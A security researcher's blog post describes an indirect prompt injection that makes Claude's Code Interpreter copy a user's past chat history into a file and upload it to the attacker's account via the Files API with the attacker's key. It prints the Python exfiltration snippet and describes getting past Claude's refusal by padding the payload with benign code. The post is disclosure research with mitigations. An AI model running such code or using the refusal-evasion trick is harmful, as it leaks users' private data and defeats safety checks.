---
title: "Claude Pirate: Abusing Anthropic's File API For Data Exfiltration"
date: 2025-10-28T08:36:30-07:00
draft: true  
tags: ["llm", "agents", "prompt injection"] 
twitter:  
  card: "summary_large_image"  
  site: "@wunderwuzzi23"  
  creator: "@wunderwuzzi23"  
  title: "Claude Pirate: Abusing Anthropic's File API For Data Exfiltration"  
  description: "Claude's Code Interpreter recently got network access, and the default allow-list enables an interesting novel exploit chain that allows an adversary to exfiltrate large amounts of data by uploading files via the Anthropic API to their own account."
  image: "https://embracethered.com/blog/images/2025/claude-pirate-tn2.png"  
---

Recently, Anthropic added the capability for Claude's Code Interpreter to perform network requests. This is obviously very dangerous as we will see in this post.

At a high level, this post is about a data exfiltration attack chain, where an adversary (either the model or third-party attacker via indirect prompt injection) can exfiltrate data the user has access to.

[![Claude Pirate Network Access](/blog/images/2025/claude-pirate-tn2.png)](/blog/images/2025/claude-pirate-tn2.png)

The interesting part is that this is not via hyperlink rendering as we often see, but by leveraging the built-in Anthropic Claude APIs!

Let's explore.

## How does Network Access Work with Claude?

The first thing I was curious about with Claude's network access was which domains are allow-listed when the default network access is on for the Code Interpreter. This is what the documentation [states](https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_152729314d)about the configuration:

> "Allow network egress to package managers only (default): Claude can access approved package managers (npm, PyPI, GitHub, etc.) to install necessary software packages. This balances functionality with security, but some advanced features may be limited."

The default setting is called "Package managers only":

[![Claude Pirate Network Access](/blog/images/2025/claude-pirate-allow-network-egress.png)](/blog/images/2025/claude-pirate-allow-network-egress.png)

That list of allowed domains is short and [documented here](https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_152729314d) as "Approved network domains":
[![Claude Pirate Network Access](/blog/images/2025/claude-approved-default-package-manager-domains.png)](/blog/images/2025/claude-approved-default-package-manager-domains.png)

This list seems quite limited.

At second glance I stopped at the first entry, `api.anthropic.com`, to think things through adversarially.

### Anthropic API Access But With a Twist

Wouldn't that allow an attacker to communicate to their own Anthropic account when compromising another user? Could an attacker send data, like messages from the compromised user to themselves?

After some research, I discovered an even more effective technique. Rather than leaking data via chat API, there is a [Files API](https://anthropic.mintlify.app/en/docs/build-with-claude/files), which allows uploading entire files to Claude. 

After uploading, those files are then visible in the [Console](https://console.anthropic.com/workspaces/default/files) and can also be retrieved again via API calls.

## High-Level Attack Idea - AI Kill Chain

Let's do some **offensive context engineering** to build an exploit. 

The idea of the attack is to build an indirect prompt injection payload that:

1. Reads data from the user and stores it to a file in the Code Interpreter named `hello.md`, specifically at this location `/mnt/user-data/outputs/hello.md`. For the demo I used [another recently introduced feature in Claude](https://www.anthropic.com/news/memory), aka. memories. Claude can now reference and search all your past chat conversations! So, the exploit will grab the last chat conversation and save it into the sandbox of Code Interpreter.
2. The next step is to trick Claude to run code to interact with the Anthropic API, **where the API key is provided by the attacker**:

```
import anthropic
import os
os.environ['ANTHROPIC_API_KEY']='attackers-api-key-redacted'
client = anthropic.Anthropic() 
client.beta.files.upload( 
    file=("hello.md", open("/mnt/user-data/outputs/hello.md", "rb"), "text/plain"), 
)
```

This code issues a request to upload the file from the sandbox. **However, this is done with a twist!**

The upload will not happen to the user's Anthropic account, but to the attackers, because it's using the attacker's ANTHROPIC_API_KEY here!

With this technique an adversary can exfiltrate up to 30MB at once according to the file API documentation, and of course we can upload multiple files.

Scary stuff.

### Iterating For A Reliable Exploit

Interestingly this worked at the very first try, but I didn't record it the first time.  

And then afterwards, I could not get it working for a longer time again. Claude would refuse the prompt injection payload. Especially having a clear text API key inside the payload was something it didn't like and thought was suspicious!

I tried tricks like XOR and base64 encoding. None worked reliably. 

However, I found a way around it... and writing exploits in 2025 seriously goes in awkward directions: I just mixed in a lot of benign code, like `print('Hello, world')` and that convinced Claude that not too many malicious things are happening. 

😈

### Demo Video

Here is a narrated demo video that shows it end-to-end. A quick walkthrough with screenshots is in the next section.

{{< youtube 2IoqhwqVI0s >}}

Hope it helps to highlight the scenario.

### Demo Screenshots

1. This is the attacker's Anthropic Console before the attack.

[![Claude Pirate - Attacker Console shows no files](/blog/images/2025/claude-pirate-step-1.png)](/blog/images/2025/claude-pirate-step-1.png)

2. Now, we switch to the target user, and observe the last conversation from the chat history (this is what the demo will steal)

[![Claude Pirate - Demo Data](/blog/images/2025/claude-pirate-step-2-zoom.png)](/blog/images/2025/claude-pirate-step-2.png)

3. Now the user analyzes a malicious document from the attacker (indirect prompt injection, this could also come via an MCP server,...)

[![Summarize this document](/blog/images/2025/claude-pirate-step-3-zoom.png)](/blog/images/2025/claude-pirate-step-3.png)

4. AI Kill Chain at a glance: The exploit hijacks Claude and follows the adversaries instructions to grab private data, write it to the sandbox, and then calls the Anthropic File API to upload the file **to the attacker's account using the attacker's API key**

[![AI Kill Chain Steps](/blog/images/2025/claude-pirate-step-4.png)](/blog/images/2025/claude-pirate-step-4.png)

5. Attacker refreshes the Files view in their Console and the target's uploaded file appears
[![Console upload of the file](/blog/images/2025/claude-pirate-step-5.png)](/blog/images/2025/claude-pirate-step-5.png)

6. The attacker can now access the file, e.g. by using it in a chat

[![Attacker views contents](/blog/images/2025/claude-pirate-step-6.png)](/blog/images/2025/claude-pirate-step-6.png)

That's it. 


## Responsible Disclosure 


**Important Update 10/30/2025: Anthropic has confirmed that data exfiltration vulnerabilities such as this one are in-scope for reporting, and this issue should not have been closed as out-of-scope.**

There was a process hiccup they will work on addressing.

As I'm highlighting under Recommendations & Mitigations below, the security considerations section of Claude [documents](https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_6b7e833898:~:text=Reading%20sensitive%20data%20from%20a%20connected%20knowledge%20source%20(for%20example%2C%20Remote%20MCP%2C%20projects)%20and%20using%20the%20sandbox%20environment%20to%20make%20an%20external%20network%20request%20to%20leak%20the%20data) data exfiltration risks and emphasizes the following mitigation: "...we recommend you monitor Claude while using the feature and stop it if you see it using or accessing data unexpectedly."


---

I disclosed this to Anthropic via HackerOne on 10/25/2025 and the ticket was closed 1 hour later with the following statement:

> "Thank you for your submission! Unfortunately, this particular issue you reported is explicitly out of scope as outlined in the [Policy Page](https://hackerone.com/anthropic). 

With further explanation that it is considered a model safety issue.

However, I do not believe this is just a safety issue, but a security vulnerability with the default network egress configuration that can lead to exfiltration of your private information.

**Safety protects you from accidents. Security protects you from adversaries.**

## Recommendations & Mitigations

For the vendor a possible mitigation is to ensure the sandbox enforces that Claude can only communicate with the logged in user's account. This would strengthen the security posture of Claude's Code Interpreter.

For end users there is the option to disable the feature, or allow-list only specific domains, as well as monitoring execution closely - if you like to live dangerously.

The [security considerations section of Claude](https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_27fc9da35e) also highlight the generic threat:

> "This means Claude can be tricked into sending information from its context (for example, prompts, projects, data via MCP, Google integrations) to malicious third parties. To mitigate these risks, we recommend you monitor Claude while using the feature and stop it if you see it using or accessing data unexpectedly. You can report issues to us using the thumbs down function directly in claude.ai."

However, users might incorrectly assume the default "Package manager only" option is secure, but it is not as this post demonstrates.

For now, to protect the innocent, I won't share the exact repro payload.

Further, it's also quite possible that other allow-listed domains from the "Package managers only" list allow for similar exploits.

## Conclusion

AI systems that can communicate with external services pose risks to confidentiality of information. Malicious content planted inside data and documents, or backdoors in a model, can exploit this to exfiltrate private information. See Simon Willison's explanation of the [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) for the fundamental challenge around this.

In many cases, this also allows establishing remote command & control (C2).

When operating Claude, be careful and considerate which domains you give it access to. As this post shows the "Package manager only" option is vulnerable to arbitrary data exfiltration. Additionally, if you grant access to the network closely watching what Claude does and stopping the chat is an option - if you like living on the edge, that is.

Stay Safe & Happy Hacking!

## Appendix - Claude Network Egress and Sandbox Security Considerations

The Anthropic documentation highlights the general threat of data exfiltration via network egress in their [security considerations](https://support.claude.com/en/articles/12111783-create-and-edit-files-with-claude#h_27fc9da35e) section:

[![Claude Pirate Network Access](/blog/images/2025/claude-network-security-considerations.png)](/blog/images/2025/claude-network-security-considerations.png)


## References

* [Files API](https://anthropic.mintlify.app/en/docs/build-with-claude/files)
* [Claude Console](https://console.anthropic.com/workspaces/default/files)
* [Simon Willison - Lethal Trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)